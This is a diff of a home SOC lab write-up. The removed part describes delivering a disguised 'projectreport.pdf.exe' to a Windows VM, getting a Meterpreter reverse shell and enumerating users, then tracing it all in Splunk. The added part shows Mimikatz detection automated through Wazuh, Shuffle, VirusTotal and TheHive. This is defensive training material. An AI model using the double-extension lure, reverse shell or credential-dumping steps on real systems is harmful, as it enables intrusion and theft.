+### 8.4 – Triggering the Workflow 🚀  
+-> On Windows 10 VM ➝ Run Mimikatz to generate alerts.  
+-> On Shuffle ➝ Click Webhook Start ➝ Click Run (person icon).  
+-> Confirm Wazuh logs are reaching Shuffle ➝ Expand execution arguments to inspect raw logs.  
 
----  
+### 8.5 – Parse SHA-256 Hash (Regex) 🔍  
+Reason for Parsing Hash:  
+We parse the hash to isolate only the SHA-256 value from the alert data. If we send unparsed data to VirusTotal, it may contain extra fields (like sha1= or md5=), causing incorrect or failed enrichment. Regex ensures we send a clean, valid hash to VirusTotal.  
+-> Change ChangeMe action ➝ Select Regex Capture Group.  
+-> Input: Input.data: $exec.text.win.evendata.hashes  
+Regex:  
 
-## 🖥️ Step 7: 🎯 Payload Delivery & Reverse Shell Gained
-  💻 On Target (Windows 10):  
-    1️⃣ Opened browser → http://192.168.56.3:9999 🌐  
-    2️⃣ Downloaded projectreport.pdf 📄 (actually projectreport.pdf.exe 🐍 — .exe hidden)  
-    3️⃣ ⚠️ Chrome Warning: “File contains malware” — Ignored & kept file  
-    4️⃣ ⚠️ Windows Defender Alert: “File may be harmful” — Chose to run anyway 🛑  
-
-  💥 Execution & Shell Access  
-  Upon execution, reverse TCP connection established 🔗  
-  Meterpreter session opened on Kali 🎉  
-
-  🔍 Post-Exploitation Actions  
-  Inside Meterpreter:  
-
-      ls  
-      shell  
-      ipconfig  
-      ipconfig /all  
-      net localgroup  
-      net user  
-
-  📌 Gathered network info, checked user accounts, and enumerated privileges 👀  
-
-<p align="center">
-  <img src="https://github.com/user-attachments/assets/ca0e12ba-a017-4a4f-9d0b-b420e156b3ca" alt="LAN Segment & IP settings" width="250" height="199"/>
-  <img src="https://github.com/user-attachments/assets/9a5db2c0-4e8e-431e-9fb3-7a66d3c37968" alt="VMware Settings" width="250" height="199"/>
-  <img src="https://github.com/user-attachments/assets/0eaa2f31-45c5-4fe3-afab-6fe42176bf5a" alt="VMware Settings" width="250" height="199"/>
-</p>
-
----  
-
-## 📊 Step 8: Splunk Analysis of Malware Execution 🕵️‍♂️
-  💡 Objective: Track malware activity (projectreport.pdf.exe) using Splunk Search & Reporting.  
-  🛠️ Actions Performed  
-  1️⃣ Opened Splunk → Search & Reporting App 📈  
-  2️⃣ Ran initial search:  
-
-      index=endpoint  
-  🔍 (endpoint was the index created earlier to store endpoint logs — including Sysmon data)  
-  3️⃣ Located multiple logs for system activities.  
-  4️⃣ Focused search to find malware traces:  
-<p align="center">
-  <img src="https://github.com/user-attachments/assets/03c42cf9-6fd0-40eb-a969-849e7c6e6a43" alt="LAN Segment & IP settings" width="350" height="250"/>
-</p>
-
-    index=endpoint "projectreport.pdf.exe"  
-  📌 Found several logs related to the file execution.  
-  5️⃣ Opened a specific log → copied Process GUID 🆔  
-  6️⃣ Queried again with the GUID:  
-  
-      index=endpoint "<Process_GUID>"  
-  📊 Retrieved detailed logs of the malware process lifecycle.  
-  7️⃣ Refined output with table formatting for clarity:  
-
-    index=endpoint "<Process_GUID>"  | table _time, parent_process, image, command_line  
-
-  🖥️ Columns included:  
-    _time ⏱️ — Timestamp of event  
-    parent_process 🏗️ — Process that spawned this activity  
-    image 🖼️ — Executable file path  
-    command_line 💻 — Full execution command  
-
-<p align="center">
-  <img src="https://github.com/user-attachments/assets/69f2784d-7fe3-4a02-aacd-1a3a98ba3655" alt="LAN Segment & IP settings" width="350" height="250"/>
-</p>
-
-📌 Result :   
-    ✅ Successfully correlated malware file execution with process hierarchy and timeline.  
-    ✅ Identified parent process, child process, full path, and execution command for forensic reporting.  
-
----  
-
-## 🛠️ Step 9: Created a Dashboard for Better Understanding
-Designed and implemented a comprehensive Splunk dashboard to visualize key security metrics and events. This dashboard includes charts for top source IPs, destination ports, user logons, process executions, suspicious parent-child process relationships, reverse shell indicators, registry key changes, and detailed endpoint logs. It helps in monitoring and quickly identifying potential security incidents during the SOC lab exercises.
-
-<img width="1904" height="500" alt="Dashboard_graphs" src="https://github.com/user-attachments/assets/555803d1-8449-4495-9118-12fb5ab0ae54" />
+    sha256=([0-9a-fA-F]{64})
+-> Rename action to sha256_regex.  
+-> Save & rerun workflow ➝ Confirm parsed hashes in execution output ✅.  
 
 
----  
+### 8.6 – VirusTotal Integration 🧪  
+-> In Shuffle ➝ Apps ➝ Search & drag VirusTotal ➝ Connect sha256_regex ➝ Configure:  
 
-## 🔍 Step 10: Correlating Reverse Shell Activity with Splunk Logs 🖥️💣
-💡 Objective: Map the attacker’s actions (Meterpreter session) to endpoint telemetry collected by Splunk for full visibility.  
+    Action: Get a hash report
+    Authentication:
+    -> Name: auth_virustotal
+    -> API Key: (paste from VirusTotal account)
+    -> API URL: https://www.virustotal.com
+    Hash Parameter: Select runtime argument ➝ groups ➝ list.
+-> Save & rerun ➝ Verify VirusTotal status = Success.  
+-> Inspect output ➝ Confirm field last_analysis_stats.malicious returns a value like 67.  
 
-🛠️ Actions Performed  
-1️⃣ From Step 7, we had a Meterpreter session opened after executing projectreport.pdf.exe.  
-2️⃣ We already had the Process GUID for the malware execution from Step 8.  
-This GUID was used as the pivot point to find related activity.  
-3️⃣ Ran a broader search in Splunk to catch all processes spawned after the malware execution:  
 
-    index=endpoint "<Process_GUID>" OR parent_process="<Malware_Process_Path>"  
-📌 This helped reveal not only the malware process but also child processes triggered by it.  
+### 8.7 – Configure TheHive 🐝  
+In thehive I created a new organization and under the new Organization I created 2 users.  
+Why I created 2 users?  
+We created two users (one analyst, one service account) to follow principle of least privilege:  
+-> Analyst User: For human interaction with Hive UI and case management.  
+-> Service Account (Shuffle): For API integration and automation — given only necessary permissions.  
 
-4️⃣ Looked specifically for commands that matched the attacker’s actions:  
-ipconfig, net user, net localgroup 🧾  
-These would appear in logs as part of cmd.exe or powershell.exe executions.  
-5️⃣ Refined query for command-line activities:  
+Steps:  
+-> Log into Hive ➝ Create new Organization (SOCProject).  
 
-    index=endpoint ("ipconfig" OR "net user" OR "net localgroup") | table _time, parent_process, image, command_line  
+    Add:
+    User 1:
+    Type: Normal
+    Login: soc@test.com
+    Role: Analyst
+    
+    User 2 (Service):
+    Type: Service
+    Login: shuffle@test.com
+    Role: Analyst
+    Generate API key ➝ Copy & store securely.
 
-💡 This showed:  
-Timestamps matching when commands were run in Meterpreter shell.  
-Parent process as cmd.exe launched by the malware.  
-6️⃣ Cross-checked the timeline of these events with the reverse shell timestamps in Kali Linux MSF console to validate correlation ✅.  
+-> Logout ➝ Test login with Analyst user to confirm.  
 
-📌 Result  
-✅ Successfully confirmed that the attacker’s shell commands directly originated from the malware execution process.  
-✅ Created a full forensic chain:  
-File Download → Execution → Reverse Shell → Commands → Detection in Splunk 🔄  
+In Shuffle:  
+-> Authenticate Hive ➝ Paste API key + Hive IP ➝ Submit.  
+-> Find Actions: Create Alert.  
+-> Configure parameters:  
+
+    Description:
+    Mimikatz detected on host ➕ runtime arg (host) ➕ from user ➕ runtime arg (user)
+    Source: Wazuh
+    SourceRef: "rule:100002"
+    Severity: 2
+    Status: new
+    Tags: ["T1003"]
+    Summary: Mimikatz activity detected on host <hostname>
+    Process ID & Command line: Select from runtime args.
+    TLP: 2
+    Type: internal
+-> Save & rerun ➝ Confirm Hive alert is generated ✅.  
+
+### 8.8 – Email Notification Setup 📧  
+-> In Shuffle ➝ Apps ➝ Search for Email ➝ Drag & connect VirusTotal to the Email.  
+-> Configure:  
+
+    Recipient: Analyst mail address
+    Subject: Mimikatz Detected
+    Body: Include runtime arguments for:
+    Time : Runtime Argument(utcTime)
+    Host : Runtime Argument(computer)
+    Title : Runtime Argument(title)
+    Severity : Runtime Argument(severity)
+-> Save & rerun ➝ Check your inbox ➝ Confirm alert email received ✅.  
 
 ---  
 
-## 🚀 Next Steps & Future Enhancements  
-🔍 Option 1: Deploy ELK Stack for deeper, faster, and more flexible log analysis — fully customized for your environment.  
-🛡️ Option 2: Deploy Wazuh SIEM (built on ELK) for advanced threat detection, automated correlation rules, and ready-made SOC dashboards.  
-🐍 Use Python automation scripts to streamline the attack workflow.  
-📟 Build a more advanced SOC dashboard that triggers real-time alerts when suspicious signatures, malware patterns, or specific attack indicators are detected — allowing analysts to respond instantly.  
+## 🎯 Outcome  
+After completing all steps, we successfully:  
+-> ✅ Detected Mimikatz Execution: Our custom Sysmon rule (ID 100002) flagged Mimikatz execution in real-time.  
+-> 📢 Alert Generated in Wazuh: The alert was automatically triggered in Wazuh with severity 2 (Medium) and proper tagging T1003 (Credential Dumping).  
+-> 🗂️ Case Created in TheHive: TheHive automatically created a case with detailed description, process ID, host, and command line arguments for analyst review.  
+-> 📧 Email Notification: SOC Analyst received a live email with all relevant details including time, host, and command line.  
+-> 🤖 Automated Workflow: Full end-to-end SOAR workflow was validated from detection → alerting → case creation → email notification.  
 
----  
+---
+
+## 🚀 Next Step and Future Enhancements  
+🔜 Short Term Plans:  
+-> 🛡️ Add more detection rules for other ATT&CK techniques (e.g., keylogging, lateral movement). 
+-> 🌐 Integrate Threat Intelligence feeds into TheHive for enrichment and context.  
+-> 📊 Configure dashboards to visualize alerts over time and severity trends.  
+🌟 Long Term Enhancements:  
+-> 🔒 Enable automatic response actions like isolating compromised hosts or disabling accounts.  
+-> 🤖 Implement AI/ML models to prioritize alerts and detect anomalies faster.  
+-> 🔗 Add integrations with SIEMs (Splunk, ELK) and EDR tools for unified monitoring.  
+-> 📁 Maintain rule baselines and version control (GitHub repo) for better team collaboration.  
+
+---
 
 ## 🏁 Conclusion  
-Through this project, we were able to:  
-🏗️ Build a fully functional cybersecurity home lab  
-💣 Simulate & analyze malware-based attacks  
-📊 Leverage Splunk for effective threat detection and incident investigation  
-⚠️ Disclaimer: This work is strictly for educational purposes. Any unauthorized use of these methods is illegal and unethical.  
+This project successfully demonstrated end-to-end SOC automation using Wazuh + Sysmon + TheHive + Shuffle.  
+With this setup:  
+-> ⏱️ We can now detect attacks like Mimikatz in near real-time.  
+-> 🧑‍💻 Automatically create incidents and notify analysts.  
+-> 📈 Build a scalable workflow that grows with new detection rules and playbooks.  
+✨ Impact: This solution significantly reduces MTTD (Mean Time to Detect) and MTTR (Mean Time to Respond), allowing analysts to focus on real threats rather than repetitive tasks.  
 
 ---  
 
